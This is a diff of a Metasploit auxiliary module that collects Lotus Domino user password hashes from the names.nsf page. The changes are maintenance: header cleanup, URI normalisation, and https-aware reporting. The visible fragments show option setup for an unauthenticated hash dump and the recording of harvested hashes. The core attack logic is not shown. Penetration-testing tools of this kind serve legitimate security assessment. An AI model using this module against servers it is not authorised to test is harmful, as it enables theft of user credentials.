@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -20,14 +16,13 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Lotus Domino Password Hash Collector',
-			'Version'        => '$Revision$',
 			'Description'    => 'Get users passwords hashes from names.nsf page',
 			'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
 			'License'        => MSF_LICENSE
 		)
 
 	register_options(
-		[ Opt::RPORT(80),
+		[
 			OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
 			OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
 			OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf']),
@@ -39,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		user = datastore['NOTES_USER'].to_s
 		pass = datastore['NOTES_PASS'].to_s
-		$uri =  datastore['URI'].to_s
+		$uri = normalize_uri(datastore['URI'])
 
 		if (user.length == 0 and pass.length == 0)
 			print_status("http://#{vhost}:#{rport} - Lotus Domino - Trying dump password hashes without credentials")
@@ -184,7 +179,7 @@ class Metasploit3 < Msf::Auxiliary
 					report_auth_info(
 						:host        => rhost,
 						:port        => rport,
-						:sname       => 'http',
+						:sname       => (ssl ? "https" : "http"),
 						:user        => short_name,
 						:pass        => pass_hash,
 						:ptype       => "domino_hash",
